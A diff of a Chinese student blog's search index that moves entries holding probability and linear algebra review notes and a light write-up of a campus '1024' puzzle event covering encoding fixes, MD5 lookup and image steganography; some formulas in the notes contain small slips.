+<p>这玩意实际运算的时候，可以查表orz…</p>
+<h3 id="均值和方差">均值和方差</h3>
+<p>对于二项分布$X$~$Bin(n,p)$，均值$E(x)=np$，方差$V(x)=np(1-p)$，标准差$\sigma_x=\sqrt{np(1-p)}$。</p>
+<p>证明均值的过程：</p>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/22/8b6e2da791c73a34.png" alt=""></p>
+<h3 id="Hypergeometric-Distribution-Negative-Binomial-Distributions（超几何分布和负二项分布）">Hypergeometric Distribution &amp; Negative Binomial Distributions（超几何分布和负二项分布）</h3>
+<h4 id="超几何分布">超几何分布</h4>
+<p>$P(X=x)=h(x;n,M,N)=\frac{出现x次的次数}{可能情况的次数}=\frac{C_M^xC_{N-M}^{n-x}}{C_N^n}$，表示总共N个物品，M个特定物品，抽取n次，抽到特定物品x次的概率。</p>
+<h5 id="期望和方差">期望和方差</h5>
+<p>$E(x)=n\frac{M}{N}$</p>
+<p>$V(x)=(\frac{N-n}{N-1})n\frac{M}{N}(1-\frac{M}{N})$</p>
+<h4 id="负二项分布">负二项分布</h4>
+<p>成功次数固定，实验次数不定</p>
+<p>$nb(x;r,p)$，表示x次失败，r次成功，单次成功概率是p，意味着x+r-1次实验之前，是r-1次成功，第x+r次必定成功</p>
+<h3 id="泊松分布">泊松分布</h3>
+<p>$p(x;\lambda)=\frac{e^{-\lambda}\lambda^x}{x!}$</p>
+<p>当二项分布$b(x;n,p)$中n极大且p极小时，可以视为泊松分布$p(x;\lambda)$，$\lambda=np$。</p>
+<h4 id="均值和方差-2">均值和方差</h4>
+<p>都是$\lambda$</p>
+<h2 id="pdf（概率密度函数）">pdf（概率密度函数）</h2>
+<p>$P(a\leq X\leq b)=\int_a^bf(x)dx$，也就是说，X在区间[a, b]中取某个值的概率是该区间上方和密度函数图下方的面积。f(x)的图形通常被称为密度曲线。</p>
+<p>$P(X=c)=\int_c^cf(x)dx=\lim_{\varepsilon\rightarrow0}\int_{c-\varepsilon}^{c+\varepsilon}f(x)dx=0$。</p>
+<p>$P(a\leq X\leq b)=F(b)-F(a)$，前提是求出概率分布函数F(x)，这样可以不用积分辣，而且更直接的是：$P(x\leq a)=F(a)$。</p>
+<p>如果x连续分布，概率密度函数f(x)和概率分布函数F(x)存在，且每一个x都存在一个对应的导数F’(x)，则$F’(x)=f(x)$。</p>
+<h3 id="期望值与方差">期望值与方差</h3>
+<p>$\mu_x=E(x)=\int_{-\infty}^{+\infty}xf(x)dx$，</p>
+<p>$E[h(X)]=\int_{-\infty}^{+\infty}h(x)f(x)dx$，或者$E[h(X)]=E(aX+b)=aE(x)+b$。</p>
+<p>$V(x)=E(x^2)-[E(x)]^2$。</p>
+<h3 id="均匀分布">均匀分布</h3>
+<p>$f(x;A,B)=\frac{1}{B-A}$  when $A\leq x\leq B$。另外的部分为0</p>
+<h2 id="正态分布">正态分布</h2>
+<h3 id="概率密度函数">概率密度函数</h3>
+<p>$f(x;\mu,\sigma)=\frac{1}{\sqrt{2\pi}\sigma}e^{-(x-\mu)^2/(2\sigma)^2}$。</p>
+<h3 id="标准正态分布">标准正态分布</h3>
+<p>$f(z;0,1)=\frac{1}{\sqrt{2\pi}}e^{-z^2/2}$      $-\infty&lt;z&lt;+\infty$。</p>
+<p>当拿到一个非标准化的正态分布时，通过找到z临界来还原标准正态分布，$z=\frac{X-\mu}{\sigma}$，其中$\mu$是期望，$\sigma$是标准差。</p>
+<h3 id="百分位数">百分位数</h3>
+<p>这个就是一个查表的玩意，比如第67个百分位数，就在正态分布表查.6700，所对应的数就是第67个百分位数，是0.44，如果在两个中间，就取中间值。</p>
+<h3 id="z数">z数</h3>
+<p><img src="https://s3.bmp.ovh/imgs/2022/12/22/7162c01b3829fa3f.png" alt=""></p>
+<p>$z_a$的下标表示大于这个数的概率是a，它同时代表了100（1-a）个百分位，也叫z临界值。</p>
+<h2 id="指数分布">指数分布</h2>
+<p>$f(X;\lambda)=\begin{cases}\lambda e^{-\lambda x},x\geq1\0,otherwise\end{cases}$</p>
+<h3 id="均值和方差-3">均值和方差</h3>
+<p>$E(X)=\int_0^{\infty}x\lambda e^{-\lambda x}dx$，这么算出来之后捏，是：</p>
+<p>$\mu=\frac{1}{\lambda}$，$\sigma^2=\frac{1}{\lambda^2}$。也就是说，无论是均值还是标准差，指数分布这俩是一样的。</p>
+<h3 id="概率分布函数">概率分布函数</h3>
+<p>$F(X;\lambda)=\begin{cases}0,x&lt;0\1-e^{-\lambda x},x\geq0\end{cases}$</p>
+<h3 id="伽马函数">伽马函数</h3>
+<p>$\gamma(a)=\int_0^\infty x^{a-1}e^{-x}dx$，</p>
+<p>性质：</p>
+<ul>
+<li>对于任意$a&gt;1$，$\gamma(a)=(a-1)*\gamma(a-1)$</li>
+<li>对于任意正整数n，$\gamma(n)=(n-1)!$</li>
+<li>$\gamma(\frac{1}{2})=\sqrt{\pi}$</li>
+</ul>
+<h3 id="伽马分布">伽马分布</h3>
+<p>就这样演变出了个新的分布：</p>
+<p>$f(x;\alpha,\beta)=\begin{cases}\frac{1}{\beta^{\alpha}\gamma(a)}x^{\alpha-1}e^{-x/\beta},x\geq0\0,otherwise\end{cases}$</p>
+<h4 id="均值和方差-4">均值和方差</h4>
+<p>$E(x)=\alpha\beta$</p>
+<p>$V(x)=\sigma^2=\alpha\beta^2$</p>
+<h4 id="概率分布函数-2">概率分布函数</h4>
+<p>如果是标准的伽马函数，分布是这样的</p>
+<p>$F(x;a)=\int_0^x\frac{y^{a-1}e^{-y}}{\gamma(a)}dy$</p>
+<h2 id="常见连续性分布的数学期望和方差">常见连续性分布的数学期望和方差</h2>
+<h3 id="均匀分布-2">均匀分布</h3>
+<p>$f(x)=\frac{1}{b-a}$当$a&lt;=x&lt;=b$时，$EX=\frac{a+b}{2}$，$DX=\frac{(b-a)^2}{12}$。</p>
+<h2 id="协方差：COV-x-y">协方差：COV(x,y)</h2>
+<h3 id="公式：">公式：</h3>
+<h3 id="cov-x-y-E-x-y-ExEy-。">$cov(x,y)=E(x,y)-ExEy$。</h3>
+<p>$f_x(x)=\int_{-\infty}^{+\infty}f(x,y)dy$           x的范围</p>
+<p>$f_y(y)=\int_{-\infty}^{+\infty}f(x,y)dx$            y的范围</p>
+<p>$E(x)=\int_{a}^{b}xf_x(x)dx$            a,b是x的范围</p>
+<p>$E(y)=\int_a^byf_y(y)dy$              a,b概念同上</p>
+<p>$E(xy)=\int_a^b\int_c^dxyf(x,y)dxdy$ <strong>这是建立在x，y不独立的基础上的</strong></p>
+<p>$E(xy)=E(x)E(y)$ 当x，y相互独立时期望算法</p>
+<h3 id="性质：">性质：</h3>
+<ul>
+<li>$Cov(x,y)=Cov(y,x)$</li>
+<li>$Cov(ax,by)=abCov(x,y)$</li>
+<li>$Cov(x_1+x_2,y)=Cov(x_1,y)+Cov(x_2,y)$</li>
+<li>$Cov(c,x)=0$ 常数和变量的协方差等于0</li>
+<li>x,y独立，$Cov(x,y)=0$ ,但是<strong>协方差为0不能得出x,y独立</strong></li>
+</ul>
+<h2 id="相关系数-rho">相关系数$\rho$</h2>
+<h3 id="公式：-2">公式：</h3>
+<p>$\rho=\frac{Cov(x,y)}{\sqrt{Dx}\sqrt{Dy}}$</p>
+<p>Dx和Dy是方差，开根号就是标准差</p>
+<p>这里有一个关于方差的公式：$D(x-y)=Dx+Dy-2Cov(x,y)$</p>
+<h3 id="性质：-2">性质：</h3>
+<p>$\rho$代表了线性关系的相关性，如果$\rho=0$则说明x，y不相关</p>
+<p>$|\rho|&lt;1$</p>
+<p>$|\rho|=1&lt;=&gt;x和y以p=1成线性关系$ 就是$p(Y=aX+b)=1$</p>
+<h3 id="独立和不相关">独立和不相关</h3>
+<p>x,y独立意思是x和y之间没有关系，互不影响，而x，y不相关的意思是x和y之间没有线性关系（可能有非线性关系）</p>
+<p>因此：</p>
+<ul>
+<li>x，y独立意味着x，y不相关</li>
+<li>x，y不相关不一定代表x，y独立</li>
+</ul>
+<p>另外要想证明x,y独立，需要知道x，y独立的充要条件，即：</p>
+<p>$f(x,y)=f_x(x)f_y(y)$</p>
+<h2 id="中心距与原点矩">中心距与原点矩</h2>
+<h3 id="定义：">定义：</h3>
+<p>原点矩：$E(x)^k$ 期望E(x)也叫一阶原点矩</p>
+<p>离散：$\sum_{0}^ix_i^kp_i$</p>
+<p>连续：$\int_{-\infty}^{\infty}x^kf(x)dx$</p>
+<p>中心距：$E(x-E(X))^k$</p>
+<p>离散:$\sum(x_i-E(x))^kp_i$</p>
+<p>连续：$\int_{-\infty}^{\infty}(x-E(x))^kf(x)dx$</p>
+<ul>
+<li>一阶中心距：$E(x-E(x))=E(x)-E(x)=0$</li>
+<li>二阶中心矩：$E(x-E(x))^2$ 就是方差</li>
+</ul>
+]]></content>
+      <categories>
+        <category>大二课程</category>
+      </categories>
+      <tags>
+        <tag>复习</tag>
+        <tag>校内课程</tag>
+        <tag>概率论</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>记录软院2022年1024解谜</title>
+    <url>/2022/11/08/%E8%AE%B0%E5%BD%95%E8%BD%AF%E9%99%A22022%E5%B9%B41024%E8%A7%A3%E8%B0%9C/</url>
+    <content><![CDATA[<p>首先是为什么写这篇文章，emmm，就当作是打了一次ctf写的wp吧，写都写了不如就发了(雾</p>
+<p>再讲一下这次1024的情况，我是在总共15题中做出9题，排名在12位，当然其中也有廖学长的提示(雾</p>
+<h4 id="第二题">第二题</h4>
+<p>第一题就不说了，兜兜转转搞半天原来就是直接点击链接进入拿到flag{hello1024}，害得我想了半天。</p>
+<p>第二题题面就很简单，经典的乱码，一眼看出文本编码问题，常见的编码出现乱码原因就是utf-8编码和gbk编码的问题，这里有一个简单的办法就是打开一个编辑器修改编码方式即可，由于正文肯定是使用utf-8编写，因此只需要在gbk编码下将内容录入编辑器再重新以utf-8打开文件即可。</p>
+<p>密文：鑷 劧鏁扮殑鍊硷紝淇濈暀灏忔暟鐐瑰悗 62 浣嶏紝涓嶇渷鐣ュ皬鏁扮偣</p>
+<p><img src="https://s2.loli.net/2022/11/09/WSFKalPjJif97Vc.png" alt="image1.png"></p>
+<p>得到正文，但是不全，这个时候就靠脑洞了…我当时还以为转错了…（逆天出题人，求一个什么什么数的小数点后62位的值，62位，基本肯定无限不循环小数，尝试${\Pi}$ 和自然对数e, 结果就是求e的小数点后64位。</p>
+<h4 id="第三题">第三题</h4>
+<p>题面：画家的密码</p>
+<p>题目：$a_1=1210a_2=321100a_3=?$</p>
+<p>也很简单，可是脑洞开的不够大了…（哭，结束之后才知道是自我描述数，反正当时是没想到…</p>
+<h4 id="第七题">第七题</h4>
+<p>解码问题，明文被加密，给出密文：627c279d7f747d9a8d2418c0f88b0960</p>
+<p>根据廖学长提醒，所有的md5加密的密文是具备固定长度的，因此看到该密文优先选择md5加密，随后找在线工具解就行，可是这题好像又有些网站解不出来，这里贴一个可以解的：<a href="https://www.t007.cn/">https://www.t007.cn/</a> 。其实网站倒是很多，多换几个就能解出来。</p>
+<h4 id="第八题">第八题</h4>
+<p>题面依然是简单至极：</p>
+<p><img src="https://s2.loli.net/2022/11/09/vM1I53uLPjr7JA2.png" alt="image2.png"></p>
+<p>搞得还以为是查看网页源代码，结果只要改一改google的黑夜模式就可以找到一串白色的文字…脑洞…</p>
+<h4 id="第十题">第十题</h4>
+<p>简单的图片隐写，先binwalk查看有没有隐藏的文件可以分离：</p>
+<p><img src="https://s2.loli.net/2022/11/09/yrxMLdfYcSqB35H.png" alt="image3.png"></p>
+<p>发现藏有一个zip，分离出来的文件是一个名字为flag的文件，但是常规方法打不开，这里我是用的ida打开，查找字符串就能找到flag,<img src="https://s2.loli.net/2022/11/09/iGOY5me6NXJp2gy.png" alt="image4.png"></p>
+<p>但是后来发现根本没必要，直接记事本打开，查找关键字flag或者关键符号&quot;{}&quot;即可找到flag，然后一眼字符串以==结尾，base64解码即可。</p>
+<h4 id="第十一题">第十一题</h4>
+<p>翻译一下得知要求最长公共子序列，直接网上搜一个代码跑一遍就行，答案不唯一选一个就好</p>
+<h4 id="第十三题">第十三题</h4>
+<p>题目：A,B,C,D  4个人组成的考古小队，在峡谷洞穴中触发陷阱，释放了僵尸，他们当即原路返回，可原路有条横跨峡谷的索桥。天色昏暗，只有一只灯，且如果有人要过桥，必须要提着灯过桥，桥上不可同时存在大于两个人的数量，或者当一群僵尸与人同时上桥时，桥便会断掉。 现在已知A过桥需要1min B:2min C:5min D:10min 而他们已经计算出僵尸群还有17min将赶上他们。怎么做才能安全脱险呢？请输出正确过程 (t代表灯，注意为规范答案，t放在表示人的字母的后面 请参照示例 示例过程：“CBt Bt BAt&quot; 代表“C与B一起过桥，他们拿着灯，（空格后面到下一个空格）代表返回过程：B带着灯回来，然后BAt指的是B跟A拿着灯过桥”)</p>
+<p>答案：ABt At CDt Bt ABt</p>
+<h4 id="第十四题">第十四题</h4>
+<p>图片隐写，由于给出了两个一样的图片，尝试stegsolve和盲水印解题，盲水印的话跑一个小脚本就行，得到一个名为out.png的图片，内容是一个篮球，上面有个100，就是答案，看得不清楚可以去stegsolve自己看看，脚本内容比较长，就不在这里放了。想要的可以网上搜一搜，很多的，<s>或者联系我捏</s>。</p>
+<p><img src="https://s2.loli.net/2022/11/09/C7qPRu4XeIMSj5V.png" alt="image5.png"></p>
+<h4 id="第十五题">第十五题</h4>
+<p>梅开二度，盲水印x2得到答案。</p>
+<p>结束！下班！来自一个啥也没干却很累的菜狗的碎碎念…</p>
+]]></content>
+      <categories>
+        <category>做题&amp;活动&amp;比赛の记录</category>
+      </categories>
+      <tags>
+        <tag>1024</tag>
+        <tag>图片隐写</tag>
+        <tag>逆天出题人</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>线代预习一些知识</title>
+    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
+    <content><![CDATA[<p>这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
+<span id="more"></span>
+<ul>
+<li>
+<p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
+</li>
+<li>
+<p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
+</li>
+<li>
+<p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
+<h4 id="施密特正交化步骤：">施密特正交化步骤：</h4>
+</li>
+<li>
+<p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
+</li>
+<li>
+<p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$</p>
+</li>
+<li>
+<p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
+<h3 id="一些关于行列式的性质：">一些关于行列式的性质：</h3>
+</li>
+</ul>
+<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
+<ol>
+<li>
+<p>$|2*A|=2^n*x$</p>
+</li>
+<li>
+<p>$|-A|=(-1)^n*x$</p>
+</li>
+<li>
+<p>$|A^2|=x^2$</p>
+</li>
+<li>
+<p>$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$</p>
+</li>
+</ol>
+<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
+<p>矩阵可逆可推出列空间是$R^3$</p>
+<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
+<p>列空间的维数是他的秩</p>
+<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
+<h4 id="克雷默法则">克雷默法则</h4>
+<p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
+<h4 id="公式">公式</h4>
+<p>$A^-1=\frac{C\tau}{|A|}$</p>
+<p>$A*C\tau=|A|*I$</p>
+<h4 id="特征值与特征向量">特征值与特征向量</h4>
+<p>特征值的和=矩阵左上右下对角线的和</p>
+<p>特征值的乘积等于矩阵的行列式</p>
+<h4 id="对角化">对角化</h4>
+<p>$\Lambda$是特征值依次排列下来的矩阵，只有对角线有元素</p>
+<p>X则是特征向量的集合的矩阵</p>
+<p>A是原矩阵</p>
+<p>有公式：</p>
+<p>$\Lambda=X^-1*A*X$</p>
+<p>$A=X^-1*\Lambda*X$</p>
+]]></content>
+      <categories>
+        <category>大一课程</category>
+      </categories>
+      <tags>
+        <tag>校内课程</tag>
+        <tag>线性代数</tag>
       </tags>
   </entry>
   <entry>
@@ -1114,332 +1440,6 @@
         <tag>复习</tag>
         <tag>校内课程</tag>
         <tag>导论</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>线代预习一些知识</title>
-    <url>/2022/06/19/%E7%BA%BF%E4%BB%A3%E5%A4%8D%E4%B9%A0%E4%B8%80%E4%BA%9B%E7%9F%A5%E8%AF%86/</url>
-    <content><![CDATA[<p>这里是复习线代的时候怕遗忘摆的一些小知识，属于是预习过后的产物了(bushi</p>
-<span id="more"></span>
-<ul>
-<li>
-<p>矩阵的加法需要的前提条件是两个矩阵<strong>行数列数</strong>相等，这叫<strong>通行矩阵</strong>，相加就是把各个元素加起来就好了</p>
-</li>
-<li>
-<p>秩的数量(rank)=矩阵列数，则矩阵内所有向量彼此<strong>线性无关</strong>，若秩的数量&lt;矩阵列数，则矩阵内向量<strong>线性相关</strong></p>
-</li>
-<li>
-<p>正交矩阵的性质：矩阵的<strong>转置</strong>=<strong>逆矩阵</strong>，矩阵点乘矩阵的转置=<strong>单位阵</strong>，行列式为1或-1</p>
-<h4 id="施密特正交化步骤：">施密特正交化步骤：</h4>
-</li>
-<li>
-<p><strong>&lt;1&gt;.</strong>   $ A=a $</p>
-</li>
-<li>
-<p><strong>&lt;2&gt;.</strong> $ B=b-\frac{A\tau*b}{A\tau*A}*A$</p>
-</li>
-<li>
-<p><strong>&lt;3&gt;.</strong> $ C=c-\frac{A\tau*c}{A\tau*A}*A-\frac{B\tau*c}{B\tau*b}*B $</p>
-<h3 id="一些关于行列式的性质：">一些关于行列式的性质：</h3>
-</li>
-</ul>
-<p>令$|A|=x$,且方阵是$n*n$的方阵：</p>
-<ol>
-<li>
-<p>$|2*A|=2^n*x$</p>
-</li>
-<li>
-<p>$|-A|=(-1)^n*x$</p>
-</li>
-<li>
-<p>$|A^2|=x^2$</p>
-</li>
-<li>
-<p>$|A^-1|=\frac{1}{|A|}=\frac{1}{x}$</p>
-</li>
-</ol>
-<p>basis 之间是线性无关的，所有的basis生成了整个空间。</p>
-<p>矩阵可逆可推出列空间是$R^3$</p>
-<p>列空间就是解的主元列的集合，零空间就是解的自由列的集合。</p>
-<p>列空间的维数是他的秩</p>
-<p>零空间的维数是自由列的数量(列数-秩的数量)</p>
-<h4 id="克雷默法则">克雷默法则</h4>
-<p>分母是整个矩阵的行列式，分子是把方程常数代入要求解变量中作为相应系数的矩阵，求解即可</p>
-<h4 id="公式">公式</h4>
-<p>$A^-1=\frac{C\tau}{|A|}$</p>
-<p>$A*C\tau=|A|*I$</p>
-<h4 id="特征值与特征向量">特征值与特征向量</h4>
-<p>特征值的和=矩阵左上右下对角线的和</p>
-<p>特征值的乘积等于矩阵的行列式</p>
-<h4 id="对角化">对角化</h4>
-<p>$\Lambda$是特征值依次排列下来的矩阵，只有对角线有元素</p>
-<p>X则是特征向量的集合的矩阵</p>
-<p>A是原矩阵</p>
-<p>有公式：</p>
-<p>$\Lambda=X^-1*A*X$</p>
-<p>$A=X^-1*\Lambda*X$</p>
-]]></content>
-      <categories>
-        <category>大一课程</category>
-      </categories>
-      <tags>
-        <tag>校内课程</tag>
-        <tag>线性代数</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>概率论复习</title>
-    <url>/2022/12/23/%E6%A6%82%E7%8E%87%E8%AE%BA%E5%A4%8D%E4%B9%A0/</url>
-    <content><![CDATA[<p>关于大二上学期概率论学的稀烂，期末复习知识不进脑子的那点事…</p>
-<h2 id="二项随机概率分布">二项随机概率分布</h2>
-<p>$b(x;n,p)$代表事件总共发生n次，有x次成功，每次事件成功的概率是p，则事件成功的概率是多少，是$C_n^xp^x(1-p)^{1-x}$。</p>
-<h3 id="cdf-概率分布函数">cdf (概率分布函数)</h3>
-<p>$P(X\leq x)=B(x;n,p)=\sum_{y=0}^xb(y;n,p)$</p>
-<p>这玩意实际运算的时候，可以查表orz…</p>
-<h3 id="均值和方差">均值和方差</h3>
-<p>对于二项分布$X$~$Bin(n,p)$，均值$E(x)=np$，方差$V(x)=np(1-p)$，标准差$\sigma_x=\sqrt{np(1-p)}$。</p>
-<p>证明均值的过程：</p>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/22/8b6e2da791c73a34.png" alt=""></p>
-<h3 id="Hypergeometric-Distribution-Negative-Binomial-Distributions（超几何分布和负二项分布）">Hypergeometric Distribution &amp; Negative Binomial Distributions（超几何分布和负二项分布）</h3>
-<h4 id="超几何分布">超几何分布</h4>
-<p>$P(X=x)=h(x;n,M,N)=\frac{出现x次的次数}{可能情况的次数}=\frac{C_M^xC_{N-M}^{n-x}}{C_N^n}$，表示总共N个物品，M个特定物品，抽取n次，抽到特定物品x次的概率。</p>
-<h5 id="期望和方差">期望和方差</h5>
-<p>$E(x)=n\frac{M}{N}$</p>
-<p>$V(x)=(\frac{N-n}{N-1})n\frac{M}{N}(1-\frac{M}{N})$</p>
-<h4 id="负二项分布">负二项分布</h4>
-<p>成功次数固定，实验次数不定</p>
-<p>$nb(x;r,p)$，表示x次失败，r次成功，单次成功概率是p，意味着x+r-1次实验之前，是r-1次成功，第x+r次必定成功</p>
-<h3 id="泊松分布">泊松分布</h3>
-<p>$p(x;\lambda)=\frac{e^{-\lambda}\lambda^x}{x!}$</p>
-<p>当二项分布$b(x;n,p)$中n极大且p极小时，可以视为泊松分布$p(x;\lambda)$，$\lambda=np$。</p>
-<h4 id="均值和方差-2">均值和方差</h4>
-<p>都是$\lambda$</p>
-<h2 id="pdf（概率密度函数）">pdf（概率密度函数）</h2>
-<p>$P(a\leq X\leq b)=\int_a^bf(x)dx$，也就是说，X在区间[a, b]中取某个值的概率是该区间上方和密度函数图下方的面积。f(x)的图形通常被称为密度曲线。</p>
-<p>$P(X=c)=\int_c^cf(x)dx=\lim_{\varepsilon\rightarrow0}\int_{c-\varepsilon}^{c+\varepsilon}f(x)dx=0$。</p>
-<p>$P(a\leq X\leq b)=F(b)-F(a)$，前提是求出概率分布函数F(x)，这样可以不用积分辣，而且更直接的是：$P(x\leq a)=F(a)$。</p>
-<p>如果x连续分布，概率密度函数f(x)和概率分布函数F(x)存在，且每一个x都存在一个对应的导数F’(x)，则$F’(x)=f(x)$。</p>
-<h3 id="期望值与方差">期望值与方差</h3>
-<p>$\mu_x=E(x)=\int_{-\infty}^{+\infty}xf(x)dx$，</p>
-<p>$E[h(X)]=\int_{-\infty}^{+\infty}h(x)f(x)dx$，或者$E[h(X)]=E(aX+b)=aE(x)+b$。</p>
-<p>$V(x)=E(x^2)-[E(x)]^2$。</p>
-<h3 id="均匀分布">均匀分布</h3>
-<p>$f(x;A,B)=\frac{1}{B-A}$  when $A\leq x\leq B$。另外的部分为0</p>
-<h2 id="正态分布">正态分布</h2>
-<h3 id="概率密度函数">概率密度函数</h3>
-<p>$f(x;\mu,\sigma)=\frac{1}{\sqrt{2\pi}\sigma}e^{-(x-\mu)^2/(2\sigma)^2}$。</p>
-<h3 id="标准正态分布">标准正态分布</h3>
-<p>$f(z;0,1)=\frac{1}{\sqrt{2\pi}}e^{-z^2/2}$      $-\infty&lt;z&lt;+\infty$。</p>
-<p>当拿到一个非标准化的正态分布时，通过找到z临界来还原标准正态分布，$z=\frac{X-\mu}{\sigma}$，其中$\mu$是期望，$\sigma$是标准差。</p>
-<h3 id="百分位数">百分位数</h3>
-<p>这个就是一个查表的玩意，比如第67个百分位数，就在正态分布表查.6700，所对应的数就是第67个百分位数，是0.44，如果在两个中间，就取中间值。</p>
-<h3 id="z数">z数</h3>
-<p><img src="https://s3.bmp.ovh/imgs/2022/12/22/7162c01b3829fa3f.png" alt=""></p>
-<p>$z_a$的下标表示大于这个数的概率是a，它同时代表了100（1-a）个百分位，也叫z临界值。</p>
-<h2 id="指数分布">指数分布</h2>
-<p>$f(X;\lambda)=\begin{cases}\lambda e^{-\lambda x},x\geq1\0,otherwise\end{cases}$</p>
-<h3 id="均值和方差-3">均值和方差</h3>
-<p>$E(X)=\int_0^{\infty}x\lambda e^{-\lambda x}dx$，这么算出来之后捏，是：</p>
-<p>$\mu=\frac{1}{\lambda}$，$\sigma^2=\frac{1}{\lambda^2}$。也就是说，无论是均值还是标准差，指数分布这俩是一样的。</p>
-<h3 id="概率分布函数">概率分布函数</h3>
-<p>$F(X;\lambda)=\begin{cases}0,x&lt;0\1-e^{-\lambda x},x\geq0\end{cases}$</p>
-<h3 id="伽马函数">伽马函数</h3>
-<p>$\gamma(a)=\int_0^\infty x^{a-1}e^{-x}dx$，</p>
-<p>性质：</p>
-<ul>
-<li>对于任意$a&gt;1$，$\gamma(a)=(a-1)*\gamma(a-1)$</li>
-<li>对于任意正整数n，$\gamma(n)=(n-1)!$</li>
-<li>$\gamma(\frac{1}{2})=\sqrt{\pi}$</li>
-</ul>
-<h3 id="伽马分布">伽马分布</h3>
-<p>就这样演变出了个新的分布：</p>
-<p>$f(x;\alpha,\beta)=\begin{cases}\frac{1}{\beta^{\alpha}\gamma(a)}x^{\alpha-1}e^{-x/\beta},x\geq0\0,otherwise\end{cases}$</p>
-<h4 id="均值和方差-4">均值和方差</h4>
-<p>$E(x)=\alpha\beta$</p>
-<p>$V(x)=\sigma^2=\alpha\beta^2$</p>
-<h4 id="概率分布函数-2">概率分布函数</h4>
-<p>如果是标准的伽马函数，分布是这样的</p>
-<p>$F(x;a)=\int_0^x\frac{y^{a-1}e^{-y}}{\gamma(a)}dy$</p>
-<h2 id="常见连续性分布的数学期望和方差">常见连续性分布的数学期望和方差</h2>
-<h3 id="均匀分布-2">均匀分布</h3>
-<p>$f(x)=\frac{1}{b-a}$当$a&lt;=x&lt;=b$时，$EX=\frac{a+b}{2}$，$DX=\frac{(b-a)^2}{12}$。</p>
-<h2 id="协方差：COV-x-y">协方差：COV(x,y)</h2>
-<h3 id="公式：">公式：</h3>
-<h3 id="cov-x-y-E-x-y-ExEy-。">$cov(x,y)=E(x,y)-ExEy$。</h3>
-<p>$f_x(x)=\int_{-\infty}^{+\infty}f(x,y)dy$           x的范围</p>
-<p>$f_y(y)=\int_{-\infty}^{+\infty}f(x,y)dx$            y的范围</p>
-<p>$E(x)=\int_{a}^{b}xf_x(x)dx$            a,b是x的范围</p>
-<p>$E(y)=\int_a^byf_y(y)dy$              a,b概念同上</p>
-<p>$E(xy)=\int_a^b\int_c^dxyf(x,y)dxdy$ <strong>这是建立在x，y不独立的基础上的</strong></p>
-<p>$E(xy)=E(x)E(y)$ 当x，y相互独立时期望算法</p>
-<h3 id="性质：">性质：</h3>
-<ul>
-<li>$Cov(x,y)=Cov(y,x)$</li>
-<li>$Cov(ax,by)=abCov(x,y)$</li>
-<li>$Cov(x_1+x_2,y)=Cov(x_1,y)+Cov(x_2,y)$</li>
-<li>$Cov(c,x)=0$ 常数和变量的协方差等于0</li>
-<li>x,y独立，$Cov(x,y)=0$ ,但是<strong>协方差为0不能得出x,y独立</strong></li>
-</ul>
-<h2 id="相关系数-rho">相关系数$\rho$</h2>
-<h3 id="公式：-2">公式：</h3>
-<p>$\rho=\frac{Cov(x,y)}{\sqrt{Dx}\sqrt{Dy}}$</p>
-<p>Dx和Dy是方差，开根号就是标准差</p>
-<p>这里有一个关于方差的公式：$D(x-y)=Dx+Dy-2Cov(x,y)$</p>
-<h3 id="性质：-2">性质：</h3>
-<p>$\rho$代表了线性关系的相关性，如果$\rho=0$则说明x，y不相关</p>
-<p>$|\rho|&lt;1$</p>
-<p>$|\rho|=1&lt;=&gt;x和y以p=1成线性关系$ 就是$p(Y=aX+b)=1$</p>
-<h3 id="独立和不相关">独立和不相关</h3>
-<p>x,y独立意思是x和y之间没有关系，互不影响，而x，y不相关的意思是x和y之间没有线性关系（可能有非线性关系）</p>
-<p>因此：</p>
-<ul>
-<li>x，y独立意味着x，y不相关</li>
-<li>x，y不相关不一定代表x，y独立</li>
-</ul>
-<p>另外要想证明x,y独立，需要知道x，y独立的充要条件，即：</p>
-<p>$f(x,y)=f_x(x)f_y(y)$</p>
-<h2 id="中心距与原点矩">中心距与原点矩</h2>
-<h3 id="定义：">定义：</h3>
-<p>原点矩：$E(x)^k$ 期望E(x)也叫一阶原点矩</p>
-<p>离散：$\sum_{0}^ix_i^kp_i$</p>
-<p>连续：$\int_{-\infty}^{\infty}x^kf(x)dx$</p>
-<p>中心距：$E(x-E(X))^k$</p>
-<p>离散:$\sum(x_i-E(x))^kp_i$</p>
-<p>连续：$\int_{-\infty}^{\infty}(x-E(x))^kf(x)dx$</p>
-<ul>
-<li>一阶中心距：$E(x-E(x))=E(x)-E(x)=0$</li>
-<li>二阶中心矩：$E(x-E(x))^2$ 就是方差</li>
-</ul>
-]]></content>
-      <categories>
-        <category>大二课程</category>
-      </categories>
-      <tags>
-        <tag>复习</tag>
-        <tag>校内课程</tag>
-        <tag>概率论</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>大二上java程序设计期末复习</title>
